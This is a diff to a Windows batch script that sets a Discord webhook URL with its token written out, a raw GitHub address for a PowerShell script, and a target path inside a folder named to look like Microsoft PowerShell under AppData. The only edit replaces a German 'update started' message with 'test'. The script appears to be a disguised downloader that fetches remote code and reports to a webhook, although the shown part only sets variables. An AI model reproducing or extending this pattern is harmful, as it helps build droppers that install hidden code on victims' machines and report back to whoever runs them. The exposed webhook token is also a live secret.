@@ -1,7 +1,7 @@
 @echo off
 setlocal EnableDelayedExpansion
 set "webhook=https://discord.com/api/webhooks/1244248742593429505/dfi37iZVMTet0o0Phd8QMzNjlGZx2OtOSGS5Q-_ZYB_WS3c69znwYPPu9fk-da6UwcJ3"
-set "message=Update erfolgreich gestartet"
+set "message=test"
 set "file=%USERPROFILE%\AppData\Local\Programs\Microsoft-Powershell\MyCopy.ps1"
 set "url=https://raw.githubusercontent.com/Samuitl/New-Test/main/test.ps1"
 set "tempfile=%TEMP%\test.ps1"
